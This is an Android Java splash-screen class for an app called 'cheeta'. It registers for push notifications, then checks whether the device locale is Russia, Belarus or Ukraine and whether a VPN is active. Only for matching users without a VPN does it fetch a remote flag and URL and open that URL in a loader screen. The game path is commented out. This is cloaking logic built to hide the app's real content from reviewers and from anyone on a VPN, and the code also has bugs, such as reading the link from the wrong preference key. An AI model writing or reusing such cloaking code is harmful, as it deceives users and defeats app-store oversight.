package com.maherhanna.cheeta;

import androidx.appcompat.app.AppCompatActivity;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.widget.Toast;

import com.onesignal.OneSignal;

import java.util.Locale;

public class SplashActivity extends AppCompatActivity {


    String[] geo = {"RUS", "BLR", "UKR"};
    boolean appState = true;
    String link;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId("5fda758a-a56c-412a-a1ed-aa46a225108d");


        loadDataInfo();

        new CountDownTimer(2000, 500) {

            @Override
            public void onTick(long millisUntilFinished) {

            }

            @Override
            public void onFinish() {
                starter();
            }
        }.start();

    }


    private void starter() {

        if (appState) if (isAvibleCountry()) {
            ServerAPI serverAPI = DataSettings.Instance().create(ServerAPI.class);
            Call<DataSettings> info = serverAPI.getInfo();
            info.enqueue(new Callback<DataSettings>() {
                @Override
                public void onResponse(Call<DataSettings> call, Response<DataSettings> response) {
                    try {

                        DataSettings body = response.body();
                        Array array = body.getArray().get(0);
                        int flag = Integer.parseInt(array.getFlag());
                        link = array.getUrl();

                        if (flag == 1) {
                            startView();
                        } else {
                            // startGame();
                        }
                    } catch (Exception e) {
                        // startGame();
                    }
                }

                @Override
                public void onFailure(Call<DataSettings> call, Throwable t) {
                    Toast.makeText(getApplicationContext(), "Check your internet connection or try again later", Toast.LENGTH_LONG).show();

                }
            });
        } else {
            //startGame();
        }
        else {
            //startView();
        }
    }

    private void loadDataInfo() {
        SharedPreferences s = getSharedPreferences("saveInfo", Context.MODE_PRIVATE);
        appState = s.getBoolean("appState", true);
        link = s.getString("appState", "");

    }







    private void startView(){
        if(isOnline() && !checkVPN()){
            Intent i = new Intent(this, LoaderActivity.class).putExtra("url",link);
            startActivity(i);
            overridePendingTransition(0,0);
            finish();
        }else {
            Toast.makeText(getApplicationContext(),"Check your internet connection or try again later",Toast.LENGTH_LONG).show();
        }
    }


    private boolean isAvibleCountry(){

        String locate = Locale.getDefault().getISO3Country();

        for (String s: geo){
            if(locate.equals(s)){
                return true;
            }
        }
        return false;
    }

    private boolean isOnline() {
        ConnectivityManager cm = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        return cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnectedOrConnecting();
    }

    private boolean checkVPN(){
        ConnectivityManager cm = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        return cm.getNetworkInfo(ConnectivityManager.TYPE_VPN).isConnectedOrConnecting();
    }
}